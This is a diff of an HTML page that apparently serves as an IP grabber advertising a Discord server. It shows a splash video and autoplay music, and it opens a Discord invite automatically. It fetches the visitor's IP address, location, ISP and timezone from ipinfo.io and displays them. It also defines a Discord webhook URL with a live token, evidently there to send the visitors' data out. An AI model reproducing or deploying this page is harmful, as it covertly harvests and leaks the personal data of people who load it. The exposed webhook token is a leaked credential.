@@ -1,37 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>discord.gg/erzhHvmNSH</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-<div class="text"></div>
+    html, body {
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Courier New', Courier, monospace;
+    }
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/erzhHvmNSH</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-
-
-    #bg-video {
+    /* Splash Screen */
+    .splash-screen {
       position: fixed;
       top: 0;
       left: 0;
-      min-width: 100%;
-      min-height: 100%;
+      height: 100%;
+      width: 100%;
+      z-index: 9999;
+      overflow: hidden;
+      background-color: black;
+    }
+
+    .splash-screen video {
+      height: 100%;
+      width: 100%;
       object-fit: cover;
-      z-index: -1;
+    }
+
+    /* Main content (hidden until splash ends) */
+    .main-content {
+      display: none;
+      height: 100%;
+      width: 100%;
+      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+      background-size: cover;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+    }
+
+    .main-content.loaded {
+      display: flex;
     }
 
     .info {
@@ -50,35 +70,51 @@
 </head>
 <body>
 
+<!-- Splash Screen with Video -->
+<div class="splash-screen">
+  <video autoplay muted playsinline onended="showMainContent()">
+    <source src="https://cdn.discordapp.com/attachments/1398784357908353044/1401860772820291594/k0J6MeEfFAc.mp4?ex=6891d015&is=68907e95&hm=6485828c41f04667841936a1547434931657eb9efbb8769bfa5491bbdaac031a&" type="video/mp4">
+    Your browser does not support HTML5 video.
+  </video>
+</div>
 
-<script>
-  function openNewTab() {
-    window.open('https://discord.gg/erzhHvmNSH', '_blank');
-  }
-openNewTab();
-</script>
-
-
+<!-- Main Page Content -->
+<div class="main-content" id="mainContent">
   <!-- 🔊 Embedded MP3 Audio (autoplay + loop) -->
   <audio autoplay loop>
-    <source src="https://cdn.discordapp.com/attachments/1361773811955007729/1361773889251967017/Falcon_Rp.mp4?ex=6890ff43&is=688fadc3&hm=153a0b902f69de158ef357f441bb5fd7235cf1351e723b2040cc3ffe5dc1d608&" type="audio/mpeg">
+    <source src="https://cdn.discordapp.com/attachments/1263875285015859324/1401862374427721779/Molchat_Doma_-__.mp3?ex=6891d193&is=68908013&hm=3479d6cb494011eb3f9be6d803e878b33619bbe39fd5cb597f3c969ffd172a35&" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
+  <div class="info" id="ip-info">
+    <strong>IP: <span id="ip"></span></strong><br>
+    <span><strong>City:</strong> <span id="city"></span></span><br>
+    <span><strong>Region:</strong> <span id="region"></span></span><br>
+    <span><strong>Country:</strong> <span id="country"></span></span><br>
+    <span><strong>Location:</strong> <span id="loc"></span></span><br>
+    <span><strong>Organization:</strong> <span id="org"></span></span><br>
+    <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+  </div>
 
-  <!-- Footer Text -->
-  <div class="text">discord.gg/erzhHvmNSH
-  
+  <div class="text">discord.gg/erzhHvmNSH</div>
+</div>
 
+<script>
+  // يظهر المحتوى الرئيسي ويخفي شاشة البداية
+  function showMainContent() {
+    document.querySelector('.splash-screen').style.display = 'none';
+    document.getElementById('mainContent').classList.add('loaded');
+  }
+
+  // احتياط: إذا ما اشتغل الفيديو بعد 10 ثواني
+  setTimeout(showMainContent, 10000);
+
+  // فتح رابط الديسكورد
+  function openNewTab() {
+    window.open('https://discord.gg/erzhHvmNSH', '_blank');
+  }
+  openNewTab();
+</script>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1401402084624044032/SAhbEAqKtHeaXxs1HJR3aHmQGwhlw5hes8HEWE9kxkAn3R2IgYE9W1iF7dqZbGJPFgrP";
@@ -113,7 +149,6 @@ openNewTab();
 </body>
 </html>
 
-
   <!-- IP Lookup Script -->
   <script>
     fetch('https://ipinfo.io/json')
@@ -128,6 +163,7 @@ openNewTab();
         document.getElementById("timezone").textContent = data.timezone;
       });
   </script>
+
 
 </body>
 </html>
